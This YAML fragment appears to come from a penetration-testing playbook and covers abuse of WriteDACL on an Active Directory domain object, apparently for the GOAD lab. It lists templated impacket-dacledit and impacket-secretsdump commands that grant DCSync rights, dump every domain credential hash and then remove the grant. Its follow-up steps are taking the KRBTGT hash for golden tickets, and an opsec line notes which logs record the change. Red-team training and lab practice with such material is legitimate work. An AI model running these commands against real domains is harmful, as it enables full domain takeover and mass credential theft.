    description: >
      If an account has WriteDACL over the domain object, grant yourself
      DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
      and dump all domain credentials. GOAD has accounts with domain object WriteDACL.
    commands:
      - label: "Grant DCSync rights via dacledit"
        cmd: "impacket-dacledit -action write -rights DCSync -principal {USERNAME} -target-dn 'DC=domain,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: "DCSync — extract all hashes"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc"
      - label: "Revoke DCSync rights (cleanup)"
        cmd: "impacket-dacledit -action remove -rights DCSync -principal {USERNAME} -target-dn 'DC=domain,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
    next:
      - Extract KRBTGT hash for golden ticket
      - Dump all user hashes
      - Revoke DCSync rights immediately after dump
    opsec: >
      ACL modification logged (4662 with GUID). BloodHound detects ACL changes.
